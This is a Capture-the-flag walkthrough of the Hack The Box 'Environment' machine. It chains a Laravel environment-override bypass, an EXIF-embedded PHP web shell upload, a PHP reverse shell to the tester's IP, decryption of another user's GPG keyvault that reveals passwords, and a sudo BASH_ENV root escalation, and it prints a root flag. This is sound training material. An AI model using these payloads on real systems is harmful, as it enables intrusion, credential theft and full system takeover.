---
sticker: emoji//1f30e
---

# PORT SCAN
---


| PORT | SERVICE |
| :--- | :------ |
| 22   | SSH     |
| 80   | HTTP    |



# RECONNAISSANCE
---

We need to add `environment.htb` to `/etc/hosts`:

```
echo '10.10.11.67 environment.htb' | sudo tee -a /etc/hosts
```


Now we can go to the web application:

![](gitbook/cybersecurity/images/Pasted%252520image%25252020250611154300.png)

Let's fuzz:

```bash
ffuf -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ -u "http://environment.htb/FUZZ" -ic -c -t 200 -e .php,.html,.txt,.git,.js

        /'___\  /'___\           /'___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://environment.htb/FUZZ
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt
 :: Extensions       : .php .html .txt .git .js
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 200
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

.git                    [Status: 403, Size: 153, Words: 3, Lines: 8, Duration: 123ms]
.js                     [Status: 403, Size: 153, Words: 3, Lines: 8, Duration: 123ms]
.txt                    [Status: 403, Size: 153, Words: 3, Lines: 8, Duration: 115ms]
.html                   [Status: 403, Size: 153, Words: 3, Lines: 8, Duration: 116ms]
index.php               [Status: 200, Size: 4602, Words: 965, Lines: 88, Duration: 217ms]
login                   [Status: 200, Size: 2391, Words: 532, Lines: 55, Duration: 893ms]
upload                  [Status: 405, Size: 244869, Words: 46159, Lines: 2576, Duration: 3035ms]
storage                 [Status: 301, Size: 169, Words: 5, Lines: 8, Duration: 108ms]
up                      [Status: 200, Size: 2126, Words: 745, Lines: 51, Duration: 2168ms]
logout                  [Status: 302, Size: 358, Words: 60, Lines: 12, Duration: 2138ms]
vendor                  [Status: 301, Size: 169, Words: 5, Lines: 8, Duration: 108ms]
robots.txt              [Status: 200, Size: 24, Words: 2, Lines: 3, Duration: 256ms]
```


We got a bunch of directories, let's check for VHOSTs first:

```
ffuf -w /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt -u http://10.10.11.67 -H "Host: FUZZ.environment.htb" -mc 200,301,302 -fs 169 -t 100 -ic -c


        /'___\  /'___\           /'___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://10.10.11.67
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt
 :: Header           : Host: FUZZ.environment.htb
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 100
 :: Matcher          : Response status: 200,301,302
 :: Filter           : Response size: 169
________________________________________________

:: Progress: [100000/100000] :: Job [1/1] :: 595 req/sec :: Duration: [0:02:15] :: Errors: 0 :
```

No vhosts, well, let's proceed, once we go to `/upload`, we find this:

![](gitbook/cybersecurity/images/Pasted%252520image%25252020250611155249.png)

As expected from the ffuf scan, this requires a POST request, also, we can see this is running:

```
php 8.2.28 - Laravel 11.30.0
```

If we search for an exploit regarding this version, we find this:

![](gitbook/cybersecurity/images/Pasted%252520image%25252020250611155805.png)

For this to work, we need to check if there's a pre-production environment, if we go to `/login`, we can see this:


![](gitbook/cybersecurity/images/Pasted%252520image%25252020250611155846.png)

As seen, we can login with a `Remember me` option, if we submit the request to a proxy, this happens:

![](gitbook/cybersecurity/images/Pasted%252520image%25252020250611155958.png)

At first sight, the request seems normal, pretty straightforward request saying we got invalid credentials, but this happens once we erase a parameter such as the password:

![](gitbook/cybersecurity/images/Pasted%252520image%25252020250611160101.png)

Request is now bigger and we can find this if we explore it:


![](gitbook/cybersecurity/images/Pasted%252520image%25252020250611160147.png)

As seen some code is being leaked, let's try setting the `Remember` parameter to something different from `True` or `False`:


![](gitbook/cybersecurity/images/Pasted%252520image%25252020250611160253.png)

This code snippet let us see the existence of the production environment:

```
App::environment() == preprod
```

Which gives us access on `/management/dashboard`, we can chain it with that CVE and try exploiting it, let's begin exploitation phase.


# EXPLOITATION
---

First of all, let's search an exploit for the CVE:

![](gitbook/cybersecurity/images/Pasted%252520image%25252020250611160430.png)

![](gitbook/cybersecurity/images/Pasted%252520image%25252020250611160651.png)


![](gitbook/cybersecurity/images/Pasted%252520image%25252020250611160715.png)

So, in order to get access to the dashboard, we need to do a post request on:

```
http://environment.htb/login?--env=prepod
```


![](gitbook/cybersecurity/images/Pasted%252520image%25252020250611160938.png)



![](gitbook/cybersecurity/images/Pasted%252520image%25252020250611160948.png)

Nice, the exploit works, let's go into the dashboard:

![](gitbook/cybersecurity/images/Pasted%252520image%25252020250611161045.png)


We got a dashboard and our profile, we can see a bunch of users that are subscribed to the mail listing on here, there are two of them unsubscribed, if we check our profile, we can see this:

![](gitbook/cybersecurity/images/Pasted%252520image%25252020250611161133.png)

As seen, we can upload images for our profile picture, the correct approach would be testing for a file upload vulnerability, let's try to embed a php web shell on an image:

```php
<?php if(isset($_REQUEST['cmd'])){ system($_REQUEST['cmd']); die; } ?>
```

Save that as `webshell.php` and do:

```php
exiftool -Comment='<?php if(isset($_REQUEST["cmd"])){ system($_REQUEST["cmd"]); die; } ?>' image.jpg
```


Now, we need to rename the file:

```
mv image.jpg webshell.php
```

If we try uploading the file with a `.php` extension it doesn't work, but, we can try `.php.`:

![](gitbook/cybersecurity/images/Pasted%252520image%25252020250611163855.png)

As seen, it works and give us the location of the webshell, if we try it:

![](gitbook/cybersecurity/images/Pasted%252520image%25252020250611163916.png)

We got RCE, nice, let's get a reverse shell:

```
http://environment.htb/storage/files/webshell.php?cmd=php+-r+%27%24sock%3dfsockopen%28%2210.10.15.10%22%2C1111%29%3bexec%28%22%2Fbin%2Fsh+-i+%3C%263+%3E%263+2%3E%263%22%29%3b%27
```

![](gitbook/cybersecurity/images/Pasted%252520image%25252020250611164331.png)

We got our shell, let's begin privilege escalation.


# PRIVILEGE ESCALATION
---


First step is to stabilize our shell:

```
python3 -c 'import pty;pty.spawn("/bin/bash")'
/usr/bin/script -qc /bin/bash /dev/null
CTRL + Z
stty raw -echo; fg
reset xterm
export TERM=xterm
export BASH=bash
```

![](gitbook/cybersecurity/images/Pasted%252520image%25252020250611164428.png)

Inside of `hish` home directory, we can find this:

```bash
www-data@environment:~/app/storage/app/public/files$ ls -la /home
total 12
drwxr-xr-x  3 root root 4096 Jan 12 11:51 .
drwxr-xr-x 18 root root 4096 Apr 30 00:31 ..
drwxr-xr-x  5 hish hish 4096 Apr 11 00:51 hish

www-data@environment:~/app/storage/app/public/files$ ls -la /home/hish/
total 36
drwxr-xr-x 5 hish hish 4096 Apr 11 00:51 .
drwxr-xr-x 3 root root 4096 Jan 12 11:51 ..
lrwxrwxrwx 1 root root    9 Apr  7 19:29 .bash_history -> /dev/null
-rw-r--r-- 1 hish hish  220 Jan  6 21:28 .bash_logout
-rw-r--r-- 1 hish hish 3526 Jan 12 14:42 .bashrc
drwxr-xr-x 4 hish hish 4096 Jun 12 07:44 .gnupg
drwxr-xr-x 3 hish hish 4096 Jan  6 21:43 .local
-rw-r--r-- 1 hish hish  807 Jan  6 21:28 .profile
drwxr-xr-x 2 hish hish 4096 Jan 12 11:49 backup
-rw-r--r-- 1 root hish   33 Jun 11 20:01 user.txt

www-data@environment:~/app/storage/app/public/files$ ls -la /home/hish/backup/
total 12
drwxr-xr-x 2 hish hish 4096 Jan 12 11:49 .
drwxr-xr-x 5 hish hish 4096 Apr 11 00:51 ..
-rw-r--r-- 1 hish hish  430 Jun 12 07:44 keyvault.gpg
```

We got a `keyvault.gpg` file, we can decrypt it with the `.gnupg` directory, the `.gnupg` directory is GnuPG’s (GPG) **configuration and key storage folder**. It’s automatically created in a user’s home directory when they use `gpg`. Here's what it contains and why it matters:

| File/Folder              | Purpose                                                                      |
| ------------------------ | ---------------------------------------------------------------------------- |
| `pubring.kbx`            | Stores **imported public keys**.                                             |
| `private-keys-v1.d/`     | Stores **user's private keys** (one per file, usually GnuPG v2+).            |
| `trustdb.gpg`            | Tracks trust levels of keys.                                                 |
| `gpg.conf`               | User configuration (keyserver, preferences, etc.).                           |
| `secring.gpg` _(legacy)_ | GnuPG v1/v1.4 file holding private keys (superseded by `private-keys-v1.d`). |
| `random_seed`            | Stores randomness seed used in crypto generation.                            |

We can do this simply one liner:

```bash
cp -R /home/hish/.gnupg /tmp && GNUPGHOME=/tmp/.gnupg gpg --decrypt /home/hish/backup/keyvault.gpg
"hish_ <hish@environment.htb>"
PAYPAL.COM -> Ihaves0meMon$yhere123
ENVIRONMENT.HTB -> marineSPm@ster!!
FACEBOOK.COM -> summerSunnyB3ACH!!
```

There we go, we got the password for hish:

```
hish:marineSPm@ster!!
```

![](gitbook/cybersecurity/images/Pasted%252520image%25252020250611170307.png)

Now, let's check our sudo privileges:

```
hish@environment:~$ sudo -l
[sudo] password for hish:
Matching Defaults entries for hish on environment:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, env_keep+="ENV BASH_ENV", use_pty

User hish may run the following commands on environment:
    (ALL) /usr/bin/systeminfo
```

We can run sudo with `/usr/bin/systeminfo`, although, the interesting stuff on here is:

```
env_keep+="ENV BASH_ENV"
```

We can exploit these environment variables by doing:

- Creating a malicious script.
- Pointing `BASH_ENV` to it.
- Running a **`sudo`-allowed command** that invokes **bash**, **or uses bash to run subcommands.**


Let's do it:

```
echo 'bash -p' > /tmp/rootshell.sh
chmod +x /tmp/rootshell.sh
```

Now, we need to set the `BASH_ENV` and run sudo:

```bash
sudo ENV=/tmp/rootshell.sh BASH_ENV=/tmp/rootshell.sh /usr/bin/systeminfo
```

![](gitbook/cybersecurity/images/Pasted%252520image%25252020250611170836.png)

There we go, we got a root shell, let's get both flags and end the CTF:

```
root@environment:/home/hish# cat /home/hish/user.txt
c

root@environment:/home/hish# cat /root/root.txt
3e7980c4bd6234998b50c3b3e6d1ac41
```

![](gitbook/cybersecurity/images/Pasted%252520image%25252020250611170934.png)

https://www.hackthebox.com/achievement/machine/1872557/659

